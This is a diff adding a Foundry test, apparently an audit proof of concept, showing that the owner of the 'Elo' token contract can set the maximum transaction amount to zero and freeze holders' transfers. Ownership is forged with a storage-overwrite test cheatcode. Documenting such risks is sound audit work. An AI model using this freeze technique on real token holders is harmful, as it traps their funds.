@@ -1,0 +1,73 @@
+```solidity
+// SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+
+interface IElo {
+    function owner() external view returns (address);
+    function setMaxTxPercent(uint256 maxTxAmount) external;
+    function _maxTxAmount() external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function isExcludedFromFee(address account) external view returns (bool);
+    function _taxFee() external view returns (uint256);
+    function _marketingFee() external view returns (uint256);
+    function _liquidityFee() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    IElo constant elo = IElo(0x35207068e057a01861A654463c01B04cc111E760);
+
+    function setUp() public {
+        vm.label(address(elo), "Elo");
+    }
+
+    function test_setMaxTxToZero_preventsTransfers() public {
+        // 1. Set owner to this contract via storage manipulation
+        // Slot 0 = _owner of Ownable (first state variable)
+        vm.store(address(elo), bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));
+
+        // Verify we are now the owner
+        assertEq(elo.owner(), address(this), "Owner should be this contract");
+
+        // 2. Call setMaxTxPercent(0) as owner
+        elo.setMaxTxPercent(0);
+
+        // 3. Confirm maxTxAmount is zero
+        assertEq(elo._maxTxAmount(), 0, "maxTxAmount should be 0");
+
+        // 4. Obtain tokens for a non-excluded victim
+        address victim = address(0x123);
+        vm.label(victim, "Victim");
+        // Owner is excluded from fees, so transfer from owner to victim bypasses maxTx check
+        uint256 transferAmount = 1000 * 10**9; // 1000 tokens (decimals 9)
+        elo.transfer(victim, transferAmount);
+        assertEq(elo.balanceOf(victim), transferAmount, "Victim should have received tokens");
+
+        // 5. Verify victim is not excluded from fee
+        assertFalse(elo.isExcludedFromFee(victim), "Victim should not be excluded from fee");
+
+        // 6. Attempt a transfer from victim (non-excluded) – should revert due to maxTx = 0
+        vm.prank(victim);
+        vm.expectRevert(bytes("Transfer amount exceeds the maxTxAmount."));
+        elo.transfer(address(0x456), 1);
+    }
+
+    function test_setMaxTxToZero_sanityCheck_beforeSetting() public {
+        // Sanity: before setting maxTx to zero, transfers work normally
+        address victim = address(0x789);
+        vm.label(victim, "Victim2");
+
+        // Mint tokens to victim (owner is this contract)
+        vm.store(address(elo), bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));
+        elo.transfer(victim, 1000 * 10**9);
+        assertFalse(elo.isExcludedFromFee(victim));
+
+        // Transfer should succeed (maxTx is still very large)
+        vm.prank(victim);
+        bool success = elo.transfer(address(0xabc), 1);
+        assertTrue(success, "Transfer should succeed before maxTx is set to 0");
+    }
+}
+```
